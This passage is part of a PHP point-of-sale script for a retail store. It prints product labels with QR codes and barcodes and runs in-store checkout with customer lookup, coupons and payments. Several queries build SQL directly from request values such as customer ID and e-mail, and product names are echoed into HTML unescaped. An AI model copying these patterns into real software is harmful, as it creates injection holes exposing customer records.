      $matchedproductcounter = 0;
      $barcodequery = '';
      if ( preg_match( '/^\d{5,6}$/', $barcode ) ) { $barcodequery = "SELECT * FROM products WHERE products_id='" . $barcode . "'"; }
      elseif ( preg_match( '/^\d{12}$/', $barcode ) ) { $barcodequery = "SELECT * FROM products WHERE products_upc_code='" . $barcode . "' OR products_manufacturer_upc_code='" . $barcode . "' OR products_manufacturer_gtin='" . $barcode . "'"; }
      elseif ( preg_match( '/^\d{13}$/', $barcode ) ) { $barcodequery = "SELECT * FROM products WHERE products_manufacturer_ean='" . $barcode . "' OR products_manufacturer_gtin='" . $barcode . "' OR products_manufacturer_upc_code='" . $barcode . "'"; }
      elseif ( preg_match( '/^\d{14}$/', $barcode ) ) { $barcodequery = "SELECT * FROM products WHERE products_manufacturer_gtin='" . $barcode . "' OR products_manufacturer_upc_code='" . $barcode . "'"; }
      else { $barcodequery = "SELECT * FROM products WHERE products_manufacturer_upc_code='" . $barcode . "'"; }
      if ( $barcodequery != '' ) {
        $productquery = mysqli_query( $link, $barcodequery );
        while ( $productinfo = mysqli_fetch_array( $productquery ) ) {
          $productid = $productinfo['products_id'];
          $matchedproductcounter++;
        }
        if ( $matchedproductcounter == 0 || $productid == 0 ) { $msg .= "Product not found, please try a different barcode or enter in the PID."; }
        elseif ( $matchedproductcounter != 1 ) { $msg .= "Ambiguous barcode, please try a different barcode or enter in the PID."; }
      }
      else { $msg .= "Invalild barcode/PID, please try again."; }
    }
    if ( $productid != '' ) {
      $productquery = mysqli_query( $link, "SELECT p.*, pd.products_name FROM products p LEFT JOIN products_description pd ON p.products_id=pd.products_id WHERE p.products_id='" . (int)$productid . "'" );
      $productinfo = mysqli_fetch_array( $productquery );

      if ( $productinfo['products_id'] > 0 ) {
        #$qrcode = '<img src="https://chart.googleapis.com/chart?chs=80x80&cht=qr&chl=https%3A%2F%2Fwww.evike.com%2Fproducts%2F' . $productinfo['products_id'] . '%2F&choe=UTF-8" />';
        #$qrcode = file_get_contents( "https://op.evike.com/qr.php?data=https%3A%2F%2Fwww.evike.com%2Fproducts%2F" . $productinfo['products_id'] . "/" );
        #$qrcodeimgdata = file_get_contents( 'https://www.evike.com/qr.php?data=https%3A%2F%2Fwww.evike.com%2Fproducts%2F' . $productinfo['products_id'] . '%2F' ); # Has trouble on some computers per Tako
        $qrcodeimgdata = "https://api.qrserver.com/v1/create-qr-code/?data=https%3A%2F%2Fwww.evike.com%2Fproducts%2F" . $productinfo['products_id'] . "%2F&size=320x320&ecc=M";
        if ( $label =='5x3' ) {
          $qrcode = '<img src="' . $qrcodeimgdata . '" style="width:200px;height:200px;" />';
          echo '<div class="productlabel" style="position:relative;width:720px;height:465px;font-family:\'Merriweather Sans\', sans-serif;">';
          echo '<div style="display:block;position:relative;margin:0;padding:0;width:100%;height:365px;border-bottom:2px solid #000;overflow:hidden;font-family:\'Merriweather Sans\', sans-serif;">';
          #echo '<div style="float:right;">' . $qrcode . '</div>';
          #echo '<h4 style="font-weight:bold;font-family:\'Francois One\', sans-serif;line-height:105%;font-size:56px;">' . $productinfo['products_name'] . '</h4>';
          echo '<textarea style="margin:0;padding:0;border:0;width:100%;height:100%;font-weight:bold;font-family:\'Francois One\', sans-serif;line-height:105%;font-size:68px;text-align:center;">' . $productinfo['products_name'] . '</textarea>';
          /*if ( $productinfo['products_fps_low'] > 0 && $productinfo['products_fps_high'] > 0 && $productinfo['products_fps_low'] < $productinfo['products_fps_high'] ) {
            echo '<h4 style="font-family:\'Francois One\', sans-serif;font-size:30px;">FPS: ' . $productinfo['products_fps_low'] . ' - ' . $productinfo['products_fps_high'] . '</h4>';
          }
          $features = '';
          if ( $productinfo['products_feature1'] != '' ) { $features .= '<li style="font-size:18px;">' . $productinfo['products_feature1'] . '</li>'; }
          if ( $productinfo['products_feature2'] != '' ) { $features .= '<li style="font-size:18px;">' . $productinfo['products_feature2'] . '</li>'; }
          if ( $productinfo['products_feature3'] != '' ) { $features .= '<li style="font-size:18px;">' . $productinfo['products_feature3'] . '</li>'; }
          if ( $productinfo['products_feature4'] != '' ) { $features .= '<li style="font-size:18px;">' . $productinfo['products_feature4'] . '</li>'; }
          if ( $productinfo['products_feature5'] != '' ) { $features .= '<li style="font-size:18px;">' . $productinfo['products_feature5'] . '</li>'; }
          if ( $productinfo['products_feature6'] != '' ) { $features .= '<li style="font-size:18px;">' . $productinfo['products_feature6'] . '</li>'; }
          if ( $productinfo['products_feature7'] != '' ) { $features .= '<li style="font-size:18px;">' . $productinfo['products_feature7'] . '</li>'; }
          if ( $productinfo['products_feature8'] != '' ) { $features .= '<li style="font-size:18px;">' . $productinfo['products_feature8'] . '</li>'; }
          if ( $features != '' ) { echo '<ul style="margin:5px 0;padding-left:15px;">' . $features . '</ul>'; }
          echo '</div>';
          echo '<div style="display:block;position:absolute;left:0;bottom:0;width:700px;height:50px;">';
          echo '<div class="barcode" style="width:250px;"><svg id="orderbarcode"></svg></div>';
          echo '<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>JsBarcode( "#orderbarcode", "' . $productinfo['products_id'] . '", { width: 2, height: 30, displayValue: false } );</script>';
          echo '<div style="display:block;position:absolute;left:270px;bottom:10px;width:80px;height:35px;"><h4 style="font-weight:bold;font-size:30px;">' . $productinfo['products_id'] . '</h4></div>';
          echo '<div style="display:block;position:absolute;right:0;bottom:10px;width:350px;height:40px;"><h4 style="font-weight:bold;font-size:36px;text-align:right;">MSRP $' . number_format( $productinfo['products_price'], 2 ) . '</h4></div>';
          echo '</div>';*/
          echo '</div>';
          $fpscontent = '';
          if ( $productinfo['products_fps_low'] > 0 && $productinfo['products_fps_high'] > 0 && $productinfo['products_fps_low'] < $productinfo['products_fps_high'] ) {
            $fpscontent = '<h4 style="margin:0;font-weight:bold;font-size:36px;text-align:right;">FPS: ' . $productinfo['products_fps_low'] . ' - ' . $productinfo['products_fps_high'] . '</h4>';
          }
          echo '<div style="display:block;position:absolute;left:0;bottom:10px;width:460px;height:95px;"><h4 style="font-weight:bold;font-size:90px;"><!--<span style="font-size:36px;margin-right:10px;">PRICE</span>-->$' . number_format( $productinfo['products_price'], 2 ) . '</h4></div>';
          echo '<div style="display:block;position:absolute;right:10px;bottom:10px;width:250px;height:80px;">' . $fpscontent . '<h4 style="margin:0;font-weight:bold;font-size:36px;text-align:right;">PID: ' . $productinfo['products_id'] . '</h4></div>';
          echo '</div>';
        }
        elseif ( $label =='6x4' ) {
          $qrcode = '<img src="' . $qrcodeimgdata . '" />';
          echo '<div class="productlabel" style="position:relative;width:520px;height:340px;font-family:\'Merriweather Sans\', sans-serif;">';
          #echo '<div style="display:block;position:absolute;left:0;top:5px;width:490px;height:380px;margin:0;padding:0;border-bottom:2px solid #000;overflow:hidden;font-family:\'Merriweather Sans\', sans-serif;">';
          #echo '<textarea style="margin:0;padding:0;border:0;width:100%;height:100%;font-weight:bold;font-family:\'Francois One\', sans-serif;line-height:105%;font-size:36px;text-align:center;">' . $productinfo['products_name'] . '</textarea>';
          #echo '</div>';
          echo '<div style="margin:0;padding:0;width:100%;height:240px;">';
          echo '<textarea style="display:inline-block;margin:0;padding:0;border:0;width:320px;height:240px;font-weight:bold;font-family:\'Francois One\', sans-serif;line-height:105%;font-size:36px;text-align:center;">' . $productinfo['products_name'] . '</textarea>';
          echo '<style>.qrcontainer img { width: 200px; }</style>';
          echo '<div style="display:block;position:absolute;right:0;top:0;width:200px;" class="qrcontainer">' . $qrcode . '</div>';
          #echo $qrcode;
          echo '</div>';
          $fpscontent = '';
          if ( $productinfo['products_fps_low'] > 0 && $productinfo['products_fps_high'] > 0 && $productinfo['products_fps_low'] < $productinfo['products_fps_high'] ) {
            $fpscontent = '<h4 style="margin:0;padding:0;font-weight:bold;font-size:32px;text-align:right;">FPS: ' . $productinfo['products_fps_low'] . ' - ' . $productinfo['products_fps_high'] . '</h4>';
          }
          echo '<div style="display:block;position:absolute;left:0;bottom:0;width:360px;height:80px;"><h4 style="font-weight:bold;font-size:68px;">$' . number_format( $productinfo['products_price'], 2 ) . '</h4></div>';
          echo '<div style="display:block;position:absolute;right:10px;bottom:0;width:360px;height:80px;">' . $fpscontent . '<h4 style="margin:0;padding:0;font-weight:bold;font-size:32px;text-align:right;">PID: ' . $productinfo['products_id'] . '</h4></div>';
          echo '</div>';
        }
        elseif ( $label =='6x4v2' ) {
          $qrcode = '<img src="' . $qrcodeimgdata . '" />';
          echo '<div class="productlabel" style="position:relative;width:520px;height:340px;font-family:\'Merriweather Sans\', sans-serif;">';
          echo '<div style="margin:0;padding:0;width:100%;height:340px;">';
          echo '<textarea style="display:inline-block;margin:0;padding:0;border:0;width:100%;height:78px;font-weight:bold;font-family:\'Francois One\', sans-serif;line-height:105%;font-size:36px;text-align:center;">' . $productinfo['products_name'] . '</textarea>';
          $fpscontent = '';
          if ( $productinfo['products_fps_low'] > 0 && $productinfo['products_fps_high'] > 0 && $productinfo['products_fps_low'] < $productinfo['products_fps_high'] ) {
            $fpscontent = '<h4 style="margin:0;padding:50px 0 0 0;font-weight:bold;font-size:40px;letter-spacing:-1px;">FPS: ' . $productinfo['products_fps_low'] . ' - ' . $productinfo['products_fps_high'] . '</h4>';
          }
          echo '<div style="display:block;width:360px;height:250px;">';
          echo $fpscontent;
          if ( $fpscontent == '' ) { echo '<h4 style="padding-top:70px;font-weight:bold;font-size:72px;letter-spacing:-1px;">$' . number_format( $productinfo['products_price'], 2 ) . '</h4>'; }
          else { echo '<h4 style="font-weight:bold;font-size:72px;letter-spacing:-1px;">$' . number_format( $productinfo['products_price'], 2 ) . '</h4>'; }
          echo '<h4 style="margin:0;padding:0;font-weight:bold;font-size:32px;letter-spacing:-1px;">PID: ' . $productinfo['products_id'] . '</h4>';
          echo '</div>';

          echo '<style>.qrcontainer img { width: 250px; }</style>';
          echo '<div style="display:block;position:absolute;right:0;top:90px;width:250px;" class="qrcontainer">' . $qrcode . '</div>';
          echo '</div>';
          echo '<div style="clear:both;"></div>';
        }
        else { # Default is 2x3
          $qrcode = '<img src="' . $qrcodeimgdata . '" style="width:125px;" />';
          echo '<div class="productlabel" style="position:relative;width:280px;height:460px;font-family:\'Merriweather Sans\', sans-serif;">';
          echo '<div style="display:block;position:relative;margin:0;padding:0;width:100%;height:370px;overflow:hidden;font-family:\'Merriweather Sans\', sans-serif;">';
          echo '<div style="float:right;">' . $qrcode . '</div>';
          echo '<h4 style="font-weight:bold;font-family:\'Francois One\', sans-serif;line-height:115%;">' . $productinfo['products_name'] . '</h4>';
          if ( $productinfo['products_fps_low'] > 0 && $productinfo['products_fps_high'] > 0 && $productinfo['products_fps_low'] < $productinfo['products_fps_high'] ) {
            echo '<h4 style="font-family:\'Francois One\', sans-serif;">FPS: ' . $productinfo['products_fps_low'] . ' - ' . $productinfo['products_fps_high'] . '</h4>';
          }
          $features = '';
          if ( $productinfo['products_feature1'] != '' ) { $features .= '<li>' . $productinfo['products_feature1'] . '</li>'; }
          if ( $productinfo['products_feature2'] != '' ) { $features .= '<li>' . $productinfo['products_feature2'] . '</li>'; }
          if ( $productinfo['products_feature3'] != '' ) { $features .= '<li>' . $productinfo['products_feature3'] . '</li>'; }
          if ( $productinfo['products_feature4'] != '' ) { $features .= '<li>' . $productinfo['products_feature4'] . '</li>'; }
          if ( $productinfo['products_feature5'] != '' ) { $features .= '<li>' . $productinfo['products_feature5'] . '</li>'; }
          if ( $productinfo['products_feature6'] != '' ) { $features .= '<li>' . $productinfo['products_feature6'] . '</li>'; }
          if ( $productinfo['products_feature7'] != '' ) { $features .= '<li>' . $productinfo['products_feature7'] . '</li>'; }
          if ( $productinfo['products_feature8'] != '' ) { $features .= '<li>' . $productinfo['products_feature8'] . '</li>'; }
          if ( $features != '' ) { echo '<ul style="margin:5px 0;padding-left:15px;">' . $features . '</ul>'; }
          echo '</div>';
          echo '<div style="display:block;position:absolute;left:0;bottom:0;width:280px;height:80px;">';
          echo '<div class="barcode" style="width:280px;"><svg id="orderbarcode"></svg></div>';
          echo '<script>JsBarcode( "#orderbarcode", "' . $productinfo['products_id'] . '", { width: 2, height: 20, displayValue: false } );</script>';
          echo '<div style="display:block;position:absolute;left:10px;bottom:20px;width:80px;height:25px;"><h4 style="font-weight:bold;font-size:24px;">' . $productinfo['products_id'] . '</h4></div>';
          echo '<div style="display:block;position:absolute;right:0;bottom:20px;width:200px;height:25px;"><h4 style="font-weight:bold;font-size:24px;text-align:right;">MSRP $' . number_format( $productinfo['products_price'], 2 ) . '</h4></div>';
          echo '</div>';
          echo '</div>';
        }
      }
      else { $msg = 'Product ' . $productid . ' not found'; }
    }
?>
   <div class="donotprint">
    <div class="completecontent">
     <h3>Scan/Enter Barcode/PID</h3>
     <form action="/store/index.php" method="post" id="queryform">
      <input type="hidden" name="action" value="storelabels" />
      <input type="hidden" name="label" id="storelabel" value="" />
      <?php if ( $msg != '' ) { echo '<p class="message">' . $msg . '</p>'; } ?>
      <input type="tel" name="barcode" class="orderlookup" id="barcodefield" value="" autofocus="autofocus" onblur="this.value=this.value.replace(/[^0-9a-zA-Z-_]/g,'');" />
      <button onclick="this.form.submit();">2x3 Label</button>
      <button onclick="$('#storelabel').val('5x3');this.form.submit();">5x3 Label</button>
      <button onclick="$('#storelabel').val('6x4v2');this.form.submit();">6x4 Label</button>
     </form>
    </div>
   </div>
<?php
  }
  elseif ( $loginuser != 84 && $loginuser != 85 ) {
#  else { // Default action is checkout
    if ( $action == 'clear_checkout' ) {
      unset( $_SESSION["customerid"] );
      unset( $_SESSION["dlid"] );
      unset( $_SESSION["leid"] );
      unset( $_SESSION["dob"] );
      unset( $_SESSION["newcustomerdata"] );
      unset( $_SESSION["cartproducts"] );
      unset( $_SESSION["customproducts"] );
      unset( $_SESSION["customprices"] );
      unset( $_SESSION["cartpayments"] );
      unset( $_SESSION["couponcode"] );
      unset( $_SESSION["ponumber"] );
      unset( $_SESSION["ordernotes"] );
      unset( $_SESSION["employeepurchase"] );
    }

    // Load new customer
    $newcustomer = false;
    if ( isset( $_SESSION["newcustomerdata"] ) ) { $newcustomerdata = $_SESSION["newcustomerdata"]; }
    else { $newcustomerdata = array(); }
    if ( $_REQUEST["newemail"] != '' || $_REQUEST["newphone"] != '' ) {
      $newcustomerdata['customers_firstname'] = $_REQUEST["newfirstname"];
      $newcustomerdata['customers_lastname'] = $_REQUEST["newlastname"];
      $newcustomerdata['customers_email_address'] = $_REQUEST["newemail"];
      $newcustomerdata['customers_telephone'] = $_REQUEST["newphone"];
      $newcustomerdata['customers_dlid'] = $_REQUEST["newdlid"];
      $newcustomerdata['customers_leid'] = $_REQUEST["newleid"];
      $newcustomerdata['customers_dob'] = $_REQUEST["newdob"];
      $customerquery = mysqli_query( $link, "SELECT * FROM customers WHERE customers_email_address LIKE '" . $newcustomerdata['customers_email_address'] . "'" );
      $customerinfo = mysqli_fetch_array( $customerquery );
      if ( $customerinfo['customers_id'] > 0 ) {
        $newcustomerdata = array();
        $msg = 'Customer account already exists with e-mail address ' . $newcustomerdata['customers_email_address'] . '. Please search and select the existing customer account or create a new account with a different e-mail address.';
      }
      else  {
        $_SESSION["newcustomerdata"] = $newcustomerdata;
        $newcustomer = true;
        $customerid = '';
        $dlid = '';
        $leid = '';
        $dob = '';
        unset( $_SESSION["customerid"] );
        unset( $_SESSION["dlid"] );
        unset( $_SESSION["leid"] );
        unset( $_SESSION["dob"] );
      }
    }
    //elseif ( $newcustomerdata['customers_email_address'] != '' || $newcustomerdata['customers_telephone'] != '' ) { $newcustomer = true; }
    elseif ( $newcustomerdata['customers_email_address'] != '' ) { $newcustomer = true; }
    else { $newcustomerdata = array(); }
    if ( $newcustomer == true && $_REQUEST["changedlid"] != '' ) {
      $newcustomerdata['customers_dlid'] = $_REQUEST["changedlid"];
      $_SESSION["newcustomerdata"] = $newcustomerdata;
    }
    if ( $newcustomer == true && $_REQUEST["changeleid"] != '' ) {
      $newcustomerdata['customers_leid'] = $_REQUEST["changeleid"];
      $_SESSION["newcustomerdata"] = $newcustomerdata;
    }
    if ( $newcustomer == true && $_REQUEST["changedob"] != '' ) {
      $newcustomerdata['customers_dob'] = $_REQUEST["changedob"];
      $_SESSION["newcustomerdata"] = $newcustomerdata;
    }

    // Load customer
    $customertier = 0;
    $taxexempt = false;
    if ( isset( $_SESSION["customerid"] ) ) {
      $customerid = $_SESSION["customerid"];
      $customerquery = mysqli_query( $link, "SELECT * FROM customers WHERE customers_id='" . $customerid . "'" );
      $customerinfo = mysqli_fetch_array( $customerquery );
      $customertier = $customerinfo['customers_group_id'];
      if ( $customertier > 0 ) {
        $couponcode = '';
        $_SESSION["couponcode"] = '';
        if ( $customerinfo['customers_sellers_permit_status'] == 1 && $customerinfo['customers_sellers_permit_id'] != '' ) { $taxexempt = true; }
      }
    }
    else { $customerid = ""; }
    if ( isset( $_SESSION["dlid"] ) ) { $dlid = $_SESSION["dlid"]; } else { $dlid = ""; }
    if ( isset( $_SESSION["leid"] ) ) { $leid = $_SESSION["leid"]; } else { $leid = ""; }
    if ( isset( $_SESSION["dob"] ) ) { $dob = $_SESSION["dob"]; } else { $dob = ""; }
    $newcustomerid = $_REQUEST["customerid"];
    $newdlid = $_REQUEST["dlid"];
    $newleid = $_REQUEST["leid"];
    $newdob = $_REQUEST["dob"];
    if ( $newcustomerid != '' ) {
      $customerquery = mysqli_query( $link, "SELECT * FROM customers WHERE customers_id='" . $newcustomerid . "'" );
      $customerinfo = mysqli_fetch_array( $customerquery );
      if ( $customerinfo['customers_id'] > 0 ) {
        $_SESSION["customerid"] = $newcustomerid;
        $customerid = $newcustomerid;
        $customertier = $customerinfo['customers_group_id'];
        if ( $customertier > 0 ) {
          $couponcode = '';
          $_SESSION["couponcode"] = '';
          if ( $customerinfo['customers_sellers_permit_status'] == 1 && $customerinfo['customers_sellers_permit_id'] != '' ) { $taxexempt = true; }
        }
        else { $taxexempt = false; }
        $newcustomer = false;
        $newcustomerdata = array();
        $dlid = '';
        $leid = '';
        $dob = '';
        unset( $_SESSION["newcustomerdata"] );
        unset( $_SESSION["dlid"] );
        unset( $_SESSION["leid"] );
        unset( $_SESSION["dob"] );
      }
      else { $msg .= 'Cannot locate selected customer, please try again.'; }
    }
    elseif ( $newdlid != '' || $newleid != '' || $newdob != '' ) {
      if ( $newdlid != '' ) { $dlid = $newdlid; $_SESSION["dlid"] = $dlid; }
      if ( $newleid != '' ) { $leid = $newleid; $_SESSION["leid"] = $leid; }
      if ( $newdob != '' ) { $dob = $newdob; $_SESSION["dob"] = $dob; }
    }
    $customerselection = "";
    $customercounter = 0;
    $email = $_REQUEST['email'];
    $phone = $_REQUEST['phone'];
    if ( $email != '' || $phone != '' ) {
      $customerqueryraw = "SELECT * FROM customers WHERE ";
      if ( $email != '' ) { $customerqueryraw .= "customers_email_address LIKE '%" . $email . "%'"; }
      if ( $phone != '' ) {
        if ( $email != '' ) { $customerqueryraw .= " AND "; }
        #$customerqueryraw .= "customers_telephone LIKE '%" . $phone . "%'";
        $phone = preg_replace( '/[^0-9,.]/', '', $phone );
        $customerqueryraw .= "REPLACE(REPLACE(REPLACE(REPLACE(customers_telephone, '(', ''), ')', ''), '-', ''), ' ', '') LIKE '%" . $phone . "%'";
      }
      if ( !in_array( $userinfo['pos_users_id'], $wholesaleaccessusers ) ) { $customerqueryraw .= " AND ( customers_group_id!=1 OR customers_id='" . $drinkspurchaseaccount . "' )"; }
      $customerqueryraw .= " LIMIT 10";
      $customerquery = mysqli_query( $link, $customerqueryraw );
      while ( $customerinfo = mysqli_fetch_array( $customerquery ) ) {
        $customerselection .= '<tr><td><input type="radio" class="customeridselectradio" name="customerid" value="' . $customerinfo['customers_id'] . '" /> ' . $customerinfo['customers_firstname'] . ' ' . $customerinfo['customers_lastname'] . '</td>';
        $customerselection .= '<td>' . $customerinfo['customers_email_address'] . '</td><td>' . $customerinfo['customers_telephone'] . '</td></tr>';
        $customercounter++;
      }
    }

    // Load products
    if ( isset( $_SESSION["cartproducts"] ) ) { $cartproducts = $_SESSION["cartproducts"]; }
    else { $cartproducts = array(); }

    // Load custom product information
    if ( isset( $_SESSION["customproducts"] ) ) { $customproducts = $_SESSION["customproducts"]; }
    else { $customproducts = array(); }
    if ( isset( $_SESSION["customprices"] ) ) { $customprices = $_SESSION["customprices"]; }
    else { $customprices = array(); }

    // Load payments
    if ( isset( $_SESSION["cartpayments"] ) ) { $cartpayments = $_SESSION["cartpayments"]; }
    else { $cartpayments = array(); }

    // Load coupon
    if ( isset( $_SESSION["couponcode"] ) ) { $couponcode = $_SESSION["couponcode"]; }
    else { $couponcode = ""; }
    $newcouponcode = $_REQUEST["couponcode"];
    if ( $newcouponcode != '' ) {
      $newcouponcode = preg_replace( "/[^a-zA-Z0-9]+/", "", $newcouponcode );
      #$couponquery = mysqli_query( $link, "SELECT * FROM discount_coupons WHERE coupons_id='" . $newcouponcode . "' AND coupons_status=1 AND coupons_discount_amount>0 AND ( coupons_discount_type='percent' OR coupons_discount_type='fixed' ) AND coupons_date_start<NOW() AND coupons_date_end>NOW() AND coupons_number_available>0 AND ( coupons_show=1 OR coupons_id='TENDOLLARSOFF' )" );
      $couponquery = mysqli_query( $link, "SELECT * FROM discount_coupons WHERE coupons_id LIKE '" . $newcouponcode . "' AND coupons_status=1 AND coupons_discount_amount>0 AND ( coupons_discount_type='percent' OR coupons_discount_type='fixed' ) AND coupons_date_start<NOW() AND coupons_date_end>NOW() AND coupons_number_available>0 AND ( coupons_outpost_id='9999' OR coupons_outpost_id=0 ) AND coupons_store_only!=2" );
      $couponinfo = mysqli_fetch_array( $couponquery );
      if ( strcasecmp( $couponinfo['coupons_id'], $newcouponcode ) == 0 ) {
        $_SESSION["couponcode"] = $couponinfo['coupons_id'];
        $couponcode = $couponinfo['coupons_id'];
      }
      else { $msg .= 'Invalid coupon code.'; }
    }
    if ( $customertier == 0 ) {
      #if ( strtotime( "now" ) > strtotime( "2019-10-19 00:00:00" ) && strtotime( "now" ) < strtotime( "2019-10-20 00:00:00" ) && $couponcode == '' ) { $couponcode = 'airsoftcon'; $_SESSION["couponcode"] = $couponcode; } // Airsoftcon auto-coupon
      #if ( strtotime( "now" ) > strtotime( "2021-11-26 00:00:00" ) && strtotime( "now" ) < strtotime( "2021-11-30 00:00:00" ) && $couponcode == '' ) { $couponcode = 'BLK2021'; $_SESSION["couponcode"] = $couponcode; } // Black friday auto-coupon
      #if ( strtotime( "now" ) > strtotime( "2022-07-01 00:00:00" ) && strtotime( "now" ) < strtotime( "2022-07-04 00:00:00" ) && $couponcode == '' ) { $couponcode = 'USA2022'; $_SESSION["couponcode"] = $couponcode; } // ID4 auto-coupon
      #if ( strtotime( "now" ) > strtotime( "2022-11-25 00:00:00" ) && strtotime( "now" ) < strtotime( "2022-12-05 00:00:00" ) && $couponcode == '' ) { $couponcode = 'Outpost10'; $_SESSION["couponcode"] = $couponcode; } // Black friday 2022 auto-coupon
      #if ( strtotime( "now" ) > strtotime( "2023-11-21 00:00:00" ) && strtotime( "now" ) < strtotime( "2023-12-01 00:00:00" ) && $couponcode == '' ) { $couponcode = 'BLKFRIDAY'; $_SESSION["couponcode"] = $couponcode; } // Black friday 2023 auto-coupon
      if ( strtotime( "now" ) > strtotime( "2024-10-18 15:00:00" ) && strtotime( "now" ) < strtotime( "2024-10-19 22:00:00" ) && $couponcode == '' ) { $couponcode = 'AIRSOFTCON2024'; $_SESSION["couponcode"] = $couponcode; } // Palooza opening auto-coupon
      if ( $couponcode == 'BLK2021' ) { $couponcode = ''; $_SESSION["couponcode"] = $couponcode; }
      if ( $couponcode == 'BLK2022' ) { $couponcode = ''; $_SESSION["couponcode"] = $couponcode; }
    }
    else {
      $couponcode = ''; $_SESSION["couponcode"] = $couponcode;
    }

    // Load PO number and notes
    if ( $_REQUEST["ponumber"] != '' ) { $_SESSION["ponumber"] = $_REQUEST["ponumber"]; }
    if ( $_REQUEST["ordernotes"] != '' ) { $_SESSION["ordernotes"] = $_REQUEST["ordernotes"]; }
    if ( $_REQUEST["employeepurchase"] != '' ) { $_SESSION["employeepurchase"] = $_REQUEST["employeepurchase"]; }

    $beepok = false;
    $beeperror = false;
    if ( $action == 'submit_checkout' ) {
      // Handle custom products
      $customcounter = 0;
      foreach ( $cartproducts as $key => $cartproductdata ) {
        $cartproduct = explode( ',', $cartproductdata );
        if ( substr( $cartproduct[1], 0, 5 ) == '72716' || substr( $cartproduct[1], 0, 5 ) == '78533' || substr( $cartproduct[1], 0, 6 ) == '113510' ) {
          $thiscounter = substr( $cartproduct[1], 6 );
          if ( $thiscounter > $customcounter ) { $customcounter = $thiscounter; }
          $thiscustomnamekey = 'customname' . $thiscounter;
          $thiscustompricekey = 'customprice' . $thiscounter;
          $thiscustomname = trim( $_REQUEST[$thiscustomnamekey] );
          $thiscustomprice = number_format( (float)trim( $_REQUEST[$thiscustompricekey] ), 2, '.', '' );
          $thiscustomname = str_replace( ',', '', $thiscustomname );
          $thiscustomname = stripslashes( $thiscustomname );
          if ( $thiscustomprice < 0.01 ) { $thiscustomprice = ''; }
          if ( $thiscustomname != '' || $thiscustomprice != '' ) { $customproducts[$thiscounter] = $thiscustomprice . ',' . $thiscustomname; }
          #$msg .= 'n:' . $thiscustomname . '|p:' . $thiscustomprice;
        }
        else {
          $thiscustompricekey = 'custompriced' . $cartproduct[1];
          $thiscustomprice = number_format( (float)trim( $_REQUEST[$thiscustompricekey] ), 2, '.', '' );
          if ( $thiscustomprice < 0.01 ) { $thiscustomprice = ''; }
          # Add price limitation check here
          #kuni

          if ( $thiscustomprice != '' ) { $customprices[$cartproduct[1]] = $thiscustomprice; }
        }
      }
      $_SESSION["customproducts"] = $customproducts;
      $_SESSION["customprices"] = $customprices;

      $quantity = $_REQUEST['quantity'];
      $barcode = trim( $_REQUEST['barcode'] );
      if ( $quantity > 0 && ( $barcode == '72716' || $barcode == '78533' || $barcode == '113510' ) ) {
        $customcounter++;
        $cartproducts[] = $quantity . ',' . $barcode . '-' . $customcounter;
        $_SESSION["cartproducts"] = $cartproducts;
        if ( $barcode == '72716' ) { $msg .= "Custom in-store only item added, please enter description and price."; }
        if ( $barcode == '78533' ) { $msg .= "Custom tech/labor/serice item added, please enter description and price."; }
        if ( $barcode == '113510' ) { $msg .= "Gift card added, please enter price."; }
      }
      elseif ( $quantity > 0 && $barcode != '' ) {
        $matchedproductcounter = 0;
        $matchedpid = '';
        $barcodequery = '';
        if ( preg_match( '/^\d{5,6}$/', $barcode ) ) { $barcodequery = "SELECT * FROM products WHERE products_id='" . $barcode . "'"; }
        elseif ( preg_match( '/^\d{12}$/', $barcode ) ) { $barcodequery = "SELECT * FROM products WHERE products_upc_code='" . $barcode . "' OR products_manufacturer_upc_code='" . $barcode . "' OR products_manufacturer_gtin='" . $barcode . "'"; }
        elseif ( preg_match( '/^\d{13}$/', $barcode ) ) { $barcodequery = "SELECT * FROM products WHERE products_manufacturer_ean='" . $barcode . "' OR products_manufacturer_gtin='" . $barcode . "' OR products_manufacturer_upc_code='" . $barcode . "'"; }
        elseif ( preg_match( '/^\d{14}$/', $barcode ) ) { $barcodequery = "SELECT * FROM products WHERE products_manufacturer_gtin='" . $barcode . "' OR products_manufacturer_upc_code='" . $barcode . "'"; }
        else { $barcodequery = "SELECT * FROM products WHERE products_manufacturer_upc_code='" . $barcode . "'"; }
        if ( $barcodequery != '' ) {
          $productquery = mysqli_query( $link, $barcodequery );
          while ( $productinfo = mysqli_fetch_array( $productquery ) ) {
            $matchedpid = $productinfo['products_id'];
            $matchedproductcounter++;
          }
          if ( $matchedproductcounter == 1 && $matchedpid > 0 ) {
            $qtyupdated = false;
            foreach ( $cartproducts as $key => $cartproductdata ) {
              $cartproduct = explode( ',', $cartproductdata );
              if ( $cartproduct[1] == $matchedpid ) {
                $newqty = $cartproduct[0] + $quantity;
                $cartproducts[$key] = $newqty . ',' . $cartproduct[1];
                $qtyupdated = true;
              }
            }
            if ( $qtyupdated == false ) {
              $cartproducts[] = $quantity . ',' . $matchedpid;
            }
            $_SESSION["cartproducts"] = $cartproducts;
            $beepok = true;
          }
          else { $msg .= "Ambiguous barcode, please try a different barcode or enter in the PID."; }
        }
        else {
          $msg .= "Invalild barcode/PID, please try again.";
          $beeperror = true;
        }
      }

      $payment_method = $_REQUEST['payment_method'];
      $payment_amount = (float)$_REQUEST['payment_amount'];
      if ( $payment_method != '' && $payment_amount != '' ) {
        $payment_method = str_replace( ',', '', $payment_method );
        $payment_amount = str_replace( ',', '', $payment_amount );
        $payment_parameter = '';
        if ( $payment_method == 'Credit Card' ) {
          $payment_parameter = trim( $_REQUEST['ccauth'] );
          if ( preg_match( "/^\d{4}$/", $payment_parameter ) ) {
            $payment_parameter = str_replace( ',', '', $payment_parameter );
            $cartpayments[] = $payment_method . ',' . number_format( $payment_amount, 2, '.', '' ) . ',' . $payment_parameter;
            $_SESSION["cartpayments"] = $cartpayments;
          }
          elseif ( $payment_parameter != '' ) { $msg .= "Invalid last 4 digits of card number."; }
          else { $msg .= "Last 4 digits of card number required for credit card payment."; }
        }
        elseif ( $payment_method == 'Store Credit' ) {
          $payment_parameter = trim( $_REQUEST['screason'] );
          if ( $payment_parameter != '' ) {
            $payment_parameter = str_replace( ',', '', $payment_parameter );
            $cartpayments[] = $payment_method . ',' . number_format( $payment_amount, 2, '.', '' ) . ',' . $payment_parameter;
            $_SESSION["cartpayments"] = $cartpayments;
          }
          else { $msg .= "Reason/details required for store credit payment."; }
        }
        elseif ( $payment_method == 'Gift Card' ) {
          $payment_parameter = $_REQUEST['gcnumber'];
          if ( $payment_parameter != '' ) {
            $payment_parameter = str_replace( ',', '', $payment_parameter );
